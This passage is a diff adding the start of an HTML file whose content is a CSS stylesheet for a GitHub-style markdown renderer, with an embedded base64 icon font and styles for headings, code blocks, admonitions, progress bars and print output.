@@ -1,0 +1,1905 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><style>body {
+  max-width: 980px;
+  border: 1px solid #ddd;
+  outline: 1300px solid #fff;
+  margin: 16px auto;
+}
+
+body .markdown-body
+{
+  padding: 45px;
+}
+
+@font-face {
+  font-family: fontawesome-mini;
+  src: url(data:font/woff;charset=utf-8;base64,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) format('woff');
+}
+
+.markdown-body {
+  font-family: sans-serif;
+  -ms-text-size-adjust: 100%;
+  -webkit-text-size-adjust: 100%;
+  color: #333333;
+  overflow: hidden;
+  font-family: "Helvetica Neue", Helvetica, "Segoe UI", Arial, freesans, sans-serif;
+  font-size: 16px;
+  line-height: 1.6;
+  word-wrap: break-word;
+}
+
+.markdown-body a {
+  background: transparent;
+}
+
+.markdown-body a:active,
+.markdown-body a:hover {
+  outline: 0;
+}
+
+.markdown-body b,
+.markdown-body strong {
+  font-weight: bold;
+}
+
+.markdown-body mark {
+  background: #ff0;
+  color: #000;
+  font-style: italic;
+  font-weight: bold;
+}
+
+.markdown-body sub,
+.markdown-body sup {
+  font-size: 75%;
+  line-height: 0;
+  position: relative;
+  vertical-align: baseline;
+}
+.markdown-body sup {
+  top: -0.5em;
+}
+.markdown-body sub {
+  bottom: -0.25em;
+}
+
+.markdown-body h1 {
+  font-size: 2em;
+  margin: 0.67em 0;
+}
+
+.markdown-body img {
+  border: 0;
+}
+
+.markdown-body hr {
+  -moz-box-sizing: content-box;
+  box-sizing: content-box;
+  height: 0;
+}
+
+.markdown-body pre {
+  overflow: auto;
+}
+
+.markdown-body code,
+.markdown-body kbd,
+.markdown-body pre,
+.markdown-body samp {
+  font-family: monospace, monospace;
+  font-size: 1em;
+}
+
+.markdown-body input {
+  color: inherit;
+  font: inherit;
+  margin: 0;
+}
+
+.markdown-body html input[disabled] {
+  cursor: default;
+}
+
+.markdown-body input {
+  line-height: normal;
+}
+
+.markdown-body input[type="checkbox"] {
+  box-sizing: border-box;
+  padding: 0;
+}
+
+.markdown-body table {
+  border-collapse: collapse;
+  border-spacing: 0;
+}
+
+.markdown-body td,
+.markdown-body th {
+  padding: 0;
+}
+
+.markdown-body .codehilitetable {
+  border: 0;
+  border-spacing: 0;
+}
+
+.markdown-body .codehilitetable tr {
+  border: 0;
+}
+
+.markdown-body .codehilitetable pre,
+.markdown-body .codehilitetable div.codehilite {
+  margin: 0;
+}
+
+.markdown-body .linenos,
+.markdown-body .code,
+.markdown-body .codehilitetable td {
+  border: 0;
+  padding: 0;
+}
+
+.markdown-body td:not(.linenos) .linenodiv {
+  padding: 0 !important;
+}
+
+.markdown-body .code {
+  width: 100%;
+}
+
+.markdown-body .linenos div pre,
+.markdown-body .linenodiv pre,
+.markdown-body .linenodiv {
+  border: 0;
+  -webkit-border-radius: 0;
+  -moz-border-radius: 0;
+  border-radius: 0;
+  -webkit-border-top-left-radius: 3px;
+  -webkit-border-bottom-left-radius: 3px;
+  -moz-border-radius-topleft: 3px;
+  -moz-border-radius-bottomleft: 3px;
+  border-top-left-radius: 3px;
+  border-bottom-left-radius: 3px;
+}
+
+.markdown-body .code div pre,
+.markdown-body .code div {
+  border: 0;
+  -webkit-border-radius: 0;
+  -moz-border-radius: 0;
+  border-radius: 0;
+  -webkit-border-top-right-radius: 3px;
+  -webkit-border-bottom-right-radius: 3px;
+  -moz-border-radius-topright: 3px;
+  -moz-border-radius-bottomright: 3px;
+  border-top-right-radius: 3px;
+  border-bottom-right-radius: 3px;
+}
+
+.markdown-body * {
+  -moz-box-sizing: border-box;
+  box-sizing: border-box;
+}
+
+.markdown-body input {
+  font: 13px Helvetica, arial, freesans, clean, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol";
+  line-height: 1.4;
+}
+
+.markdown-body a {
+  color: #4183c4;
+  text-decoration: none;
+}
+
+.markdown-body a:hover,
+.markdown-body a:focus,
+.markdown-body a:active {
+  text-decoration: underline;
+}
+
+.markdown-body hr {
+  height: 0;
+  margin: 15px 0;
+  overflow: hidden;
+  background: transparent;
+  border: 0;
+  border-bottom: 1px solid #ddd;
+}
+
+.markdown-body hr:before,
+.markdown-body hr:after {
+  display: table;
+  content: " ";
+}
+
+.markdown-body hr:after {
+  clear: both;
+}
+
+.markdown-body h1,
+.markdown-body h2,
+.markdown-body h3,
+.markdown-body h4,
+.markdown-body h5,
+.markdown-body h6 {
+  margin-top: 15px;
+  margin-bottom: 15px;
+  line-height: 1.1;
+}
+
+.markdown-body h1 {
+  font-size: 30px;
+}
+
+.markdown-body h2 {
+  font-size: 21px;
+}
+
+.markdown-body h3 {
+  font-size: 16px;
+}
+
+.markdown-body h4 {
+  font-size: 14px;
+}
+
+.markdown-body h5 {
+  font-size: 12px;
+}
+
+.markdown-body h6 {
+  font-size: 11px;
+}
+
+.markdown-body blockquote {
+  margin: 0;
+}
+
+.markdown-body ul,
+.markdown-body ol {
+  padding: 0;
+  margin-top: 0;
+  margin-bottom: 0;
+}
+
+.markdown-body ol ol,
+.markdown-body ul ol {
+  list-style-type: lower-roman;
+}
+
+.markdown-body ul ul ol,
+.markdown-body ul ol ol,
+.markdown-body ol ul ol,
+.markdown-body ol ol ol {
+  list-style-type: lower-alpha;
+}
+
+.markdown-body dd {
+  margin-left: 0;
+}
+
+.markdown-body code,
+.markdown-body pre,
+.markdown-body samp {
+  font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
+  font-size: 12px;
+}
+
+.markdown-body pre {
+  margin-top: 0;
+  margin-bottom: 0;
+}
+
+.markdown-body kbd {
+  background-color: #e7e7e7;
+  background-image: -moz-linear-gradient(#fefefe, #e7e7e7);
+  background-image: -webkit-linear-gradient(#fefefe, #e7e7e7);
+  background-image: linear-gradient(#fefefe, #e7e7e7);
+  background-repeat: repeat-x;
+  border-radius: 2px;
+  border: 1px solid #cfcfcf;
+  color: #000;
+  padding: 3px 5px;
+  line-height: 10px;
+  font: 11px Consolas, "Liberation Mono", Menlo, Courier, monospace;
+  display: inline-block;
+}
+
+.markdown-body>*:first-child {
+  margin-top: 0 !important;
+}
+
+.markdown-body>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+.markdown-body .headerlink {
+  font: normal 400 16px fontawesome-mini;
+  vertical-align: middle;
+  margin-left: -16px;
+  float: left;
+  display: inline-block;
+  text-decoration: none;
+  opacity: 0;
+  color: #333;
+}
+
+.markdown-body .headerlink:focus {
+  outline: none;
+}
+
+.markdown-body h1 .headerlink {
+  margin-top: 0.8rem;
+}
+
+.markdown-body h2 .headerlink,
+.markdown-body h3 .headerlink {
+  margin-top: 0.6rem;
+}
+
+.markdown-body h4 .headerlink {
+  margin-top: 0.2rem;
+}
+
+.markdown-body h5 .headerlink,
+.markdown-body h6 .headerlink {
+  margin-top: 0;
+}
+
+.markdown-body .headerlink:hover,
+.markdown-body h1:hover .headerlink,
+.markdown-body h2:hover .headerlink,
+.markdown-body h3:hover .headerlink,
+.markdown-body h4:hover .headerlink,
+.markdown-body h5:hover .headerlink,
+.markdown-body h6:hover .headerlink {
+  opacity: 1;
+  text-decoration: none;
+}
+
+.markdown-body h1 {
+  padding-bottom: 0.3em;
+  font-size: 2.25em;
+  line-height: 1.2;
+  border-bottom: 1px solid #eee;
+}
+
+.markdown-body h2 {
+  padding-bottom: 0.3em;
+  font-size: 1.75em;
+  line-height: 1.225;
+  border-bottom: 1px solid #eee;
+}
+
+.markdown-body h3 {
+  font-size: 1.5em;
+  line-height: 1.43;
+}
+
+.markdown-body h4 {
+  font-size: 1.25em;
+}
+
+.markdown-body h5 {
+  font-size: 1em;
+}
+
+.markdown-body h6 {
+  font-size: 1em;
+  color: #777;
+}
+
+.markdown-body p,
+.markdown-body blockquote,
+.markdown-body ul,
+.markdown-body ol,
+.markdown-body dl,
+.markdown-body table,
+.markdown-body pre,
+.markdown-body .admonition {
+  margin-top: 0;
+  margin-bottom: 16px;
+}
+
+.markdown-body hr {
+  height: 4px;
+  padding: 0;
+  margin: 16px 0;
+  background-color: #e7e7e7;
+  border: 0 none;
+}
+
+.markdown-body ul,
+.markdown-body ol {
+  padding-left: 2em;
+}
+
+.markdown-body ul ul,
+.markdown-body ul ol,
+.markdown-body ol ol,
+.markdown-body ol ul {
+  margin-top: 0;
+  margin-bottom: 0;
+}
+
+.markdown-body li>p {
+  margin-top: 16px;
+}
+
+.markdown-body dl {
+  padding: 0;
+}
+
+.markdown-body dl dt {
+  padding: 0;
+  margin-top: 16px;
+  font-size: 1em;
+  font-style: italic;
+  font-weight: bold;
+}
+
+.markdown-body dl dd {
+  padding: 0 16px;
+  margin-bottom: 16px;
+}
+
+.markdown-body blockquote {
+  padding: 0 15px;
+  color: #777;
+  border-left: 4px solid #ddd;
+}
+
+.markdown-body blockquote>:first-child {
+  margin-top: 0;
+}
+
+.markdown-body blockquote>:last-child {
+  margin-bottom: 0;
+}
+
+.markdown-body table {
+  display: block;
+  width: 100%;
+  overflow: auto;
+  word-break: normal;
+  word-break: keep-all;
+}
+
+.markdown-body table th {
+  font-weight: bold;
+}
+
+.markdown-body table th,
+.markdown-body table td {
+  padding: 6px 13px;
+  border: 1px solid #ddd;
+}
+
+.markdown-body table tr {
+  background-color: #fff;
+  border-top: 1px solid #ccc;
+}
+
+.markdown-body table tr:nth-child(2n) {
+  background-color: #f8f8f8;
+}
+
+.markdown-body img {
+  max-width: 100%;
+  -moz-box-sizing: border-box;
+  box-sizing: border-box;
+}
+
+.markdown-body code,
+.markdown-body samp {
+  padding: 0;
+  padding-top: 0.2em;
+  padding-bottom: 0.2em;
+  margin: 0;
+  font-size: 85%;
+  background-color: rgba(0,0,0,0.04);
+  border-radius: 3px;
+}
+
+.markdown-body code:before,
+.markdown-body code:after {
+  letter-spacing: -0.2em;
+  content: "\00a0";
+}
+
+.markdown-body pre>code {
+  padding: 0;
+  margin: 0;
+  font-size: 100%;
+  word-break: normal;
+  white-space: pre;
+  background: transparent;
+  border: 0;
+}
+
+.markdown-body .codehilite {
+  margin-bottom: 16px;
+}
+
+.markdown-body .codehilite pre,
+.markdown-body pre {
+  padding: 16px;
+  overflow: auto;
+  font-size: 85%;
+  line-height: 1.45;
+  background-color: #f7f7f7;
+  border-radius: 3px;
+}
+
+.markdown-body .codehilite pre {
+  margin-bottom: 0;
+  word-break: normal;
+}
+
+.markdown-body pre {
+  word-wrap: normal;
+}
+
+.markdown-body pre code {
+  display: inline;
+  max-width: initial;
+  padding: 0;
+  margin: 0;
+  overflow: initial;
+  line-height: inherit;
+  word-wrap: normal;
+  background-color: transparent;
+  border: 0;
+}
+
+.markdown-body pre code:before,
+.markdown-body pre code:after {
+  content: normal;
+}
+
+/* Admonition */
+.markdown-body .admonition {
+  -webkit-border-radius: 3px;
+  -moz-border-radius: 3px;
+  position: relative;
+  border-radius: 3px;
+  border: 1px solid #e0e0e0;
+  border-left: 6px solid #333;
+  padding: 10px 10px 10px 30px;
+}
+
+.markdown-body .admonition table {
+  color: #333;
+}
+
+.markdown-body .admonition p {
+  padding: 0;
+}
+
+.markdown-body .admonition-title {
+  font-weight: bold;
+  margin: 0;
+}
+
+.markdown-body .admonition>.admonition-title {
+  color: #333;
+}
+
+.markdown-body .attention>.admonition-title {
+  color: #a6d796;
+}
+
+.markdown-body .caution>.admonition-title {
+  color: #d7a796;
+}
+
+.markdown-body .hint>.admonition-title {
+  color: #96c6d7;
+}
+
+.markdown-body .danger>.admonition-title {
+  color: #c25f77;
+}
+
+.markdown-body .question>.admonition-title {
+  color: #96a6d7;
+}
+
+.markdown-body .note>.admonition-title {
+  color: #d7c896;
+}
+
+.markdown-body .admonition:before,
+.markdown-body .attention:before,
+.markdown-body .caution:before,
+.markdown-body .hint:before,
+.markdown-body .danger:before,
+.markdown-body .question:before,
+.markdown-body .note:before {
+  font: normal normal 16px fontawesome-mini;
+  -moz-osx-font-smoothing: grayscale;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+  line-height: 1.5;
+  color: #333;
+  position: absolute;
+  left: 0;
+  top: 0;
+  padding-top: 10px;
+  padding-left: 10px;
+}
+
+.markdown-body .admonition:before {
+  content: "\f056\00a0";
+  color: 333;
+}
+
+.markdown-body .attention:before {
+  content: "\f058\00a0";
+  color: #a6d796;
+}
+
+.markdown-body .caution:before {
+  content: "\f06a\00a0";
+  color: #d7a796;
+}
+
+.markdown-body .hint:before {
+  content: "\f05a\00a0";
+  color: #96c6d7;
+}
+
+.markdown-body .danger:before {
+  content: "\f057\00a0";
+  color: #c25f77;
+}
+
+.markdown-body .question:before {
+  content: "\f059\00a0";
+  color: #96a6d7;
+}
+
+.markdown-body .note:before {
+  content: "\f040\00a0";
+  color: #d7c896;
+}
+
+.markdown-body .admonition::after {
+  content: normal;
+}
+
+.markdown-body .attention {
+  border-left: 6px solid #a6d796;
+}
+
+.markdown-body .caution {
+  border-left: 6px solid #d7a796;
+}
+
+.markdown-body .hint {
+  border-left: 6px solid #96c6d7;
+}
+
+.markdown-body .danger {
+  border-left: 6px solid #c25f77;
+}
+
+.markdown-body .question {
+  border-left: 6px solid #96a6d7;
+}
+
+.markdown-body .note {
+  border-left: 6px solid #d7c896;
+}
+
+.markdown-body .admonition>*:first-child {
+  margin-top: 0 !important;
+}
+
+.markdown-body .admonition>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+/* progress bar*/
+.markdown-body .progress {
+  display: block;
+  width: 300px;
+  margin: 10px 0;
+  height: 24px;
+  -webkit-border-radius: 3px;
+  -moz-border-radius: 3px;
+  border-radius: 3px;
+  background-color: #ededed;
+  position: relative;
+  box-shadow: inset -1px 1px 3px rgba(0, 0, 0, .1);
+}
+
+.markdown-body .progress-label {
+  position: absolute;
+  text-align: center;
+  font-weight: bold;
+  width: 100%; margin: 0;
+  line-height: 24px;
+  color: #333;
+  text-shadow: 1px 1px 0 #fefefe, -1px -1px 0 #fefefe, -1px 1px 0 #fefefe, 1px -1px 0 #fefefe, 0 1px 0 #fefefe, 0 -1px 0 #fefefe, 1px 0 0 #fefefe, -1px 0 0 #fefefe, 1px 1px 2px #000;
+  -webkit-font-smoothing: antialiased !important;
+  white-space: nowrap;
+  overflow: hidden;
+}
+
+.markdown-body .progress-bar {
+  height: 24px;
+  float: left;
+  -webkit-border-radius: 3px;
+  -moz-border-radius: 3px;
+  border-radius: 3px;
+  background-color: #96c6d7;
+  box-shadow: inset 0 1px 0 rgba(255, 255, 255, .5), inset 0 -1px 0 rgba(0, 0, 0, .1);
+  background-size: 30px 30px;
+  background-image: -webkit-linear-gradient(
+    135deg, rgba(255, 255, 255, .4) 27%,
+    transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%,
+    transparent 77%, transparent
+  );
+  background-image: -moz-linear-gradient(
+    135deg,
+    rgba(255, 255, 255, .4) 27%, transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%, transparent 77%,
+    transparent
+  );
+  background-image: -ms-linear-gradient(
+    135deg,
+    rgba(255, 255, 255, .4) 27%, transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%, transparent 77%,
+    transparent
+  );
+  background-image: -o-linear-gradient(
+    135deg,
+    rgba(255, 255, 255, .4) 27%, transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%, transparent 77%,
+    transparent
+  );
+  background-image: linear-gradient(
+    135deg,
+    rgba(255, 255, 255, .4) 27%, transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%, transparent 77%,
+    transparent
+  );
+}
+
+.markdown-body .progress-100plus .progress-bar {
+  background-color: #a6d796;
+}
+
+.markdown-body .progress-80plus .progress-bar {
+  background-color: #c6d796;
+}
+
+.markdown-body .progress-60plus .progress-bar {
+  background-color: #d7c896;
+}
+
+.markdown-body .progress-40plus .progress-bar {
+  background-color: #d7a796;
+}
+
+.markdown-body .progress-20plus .progress-bar {
+  background-color: #d796a6;
+}
+
+.markdown-body .progress-0plus .progress-bar {
+  background-color: #c25f77;
+}
+
+.markdown-body .candystripe-animate .progress-bar{
+  -webkit-animation: animate-stripes 3s linear infinite;
+  -moz-animation: animate-stripes 3s linear infinite;
+  animation: animate-stripes 3s linear infinite;
+}
+
+@-webkit-keyframes animate-stripes {
+  0% {
+    background-position: 0 0;
+  }
+
+  100% {
+    background-position: 60px 0;
+  }
+}
+
+@-moz-keyframes animate-stripes {
+  0% {
+    background-position: 0 0;
+  }
+
+  100% {
+    background-position: 60px 0;
+  }
+}
+
+@keyframes animate-stripes {
+  0% {
+    background-position: 0 0;
+  }
+
+  100% {
+    background-position: 60px 0;
+  }
+}
+
+.markdown-body .gloss .progress-bar {
+  box-shadow:
+    inset 0 4px 12px rgba(255, 255, 255, .7),
+    inset 0 -12px 0 rgba(0, 0, 0, .05);
+}
+
+/* MultiMarkdown Critic Blocks */
+.markdown-body .critic_mark {
+  background: #ff0;
+}
+
+.markdown-body .critic_delete {
+  color: #c82829;
+  text-decoration: line-through;
+}
+
+.markdown-body .critic_insert {
+  color: #718c00 ;
+  text-decoration: underline;
+}
+
+.markdown-body .critic_comment {
+  color: #8e908c;
+  font-style: italic;
+}
+
+.markdown-body .headeranchor {
+  font: normal normal 16px fontawesome-mini;
+  line-height: 1;
+  display: inline-block;
+  text-decoration: none;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+}
+
+.headeranchor:before {
+  content: '\e157';
+}
+
+.markdown-body .task-list-item {
+  list-style-type: none;
+}
+
+.markdown-body .task-list-item+.task-list-item {
+  margin-top: 3px;
+}
+
+.markdown-body .task-list-item input {
+  margin: 0 4px 0.25em -20px;
+  vertical-align: middle;
+}
+
+/* Media */
+@media only screen and (min-width: 480px) {
+  .markdown-body {
+    font-size:14px;
+  }
+}
+
+@media only screen and (min-width: 768px) {
+  .markdown-body {
+    font-size:16px;
+  }
+}
+
+@media print {
+  .markdown-body * {
+    background: transparent !important;
+    color: black !important;
+    filter:none !important;
+    -ms-filter: none !important;
+  }
+
+  .markdown-body {
+    font-size:12pt;
+    max-width:100%;
+    outline:none;
+    border: 0;
+  }
+
+  .markdown-body a,
+  .markdown-body a:visited {
+    text-decoration: underline;
+  }
+
+  .markdown-body .headeranchor-link {
+    display: none;
+  }
+
+  .markdown-body a[href]:after {
+    content: " (" attr(href) ")";
+  }
+
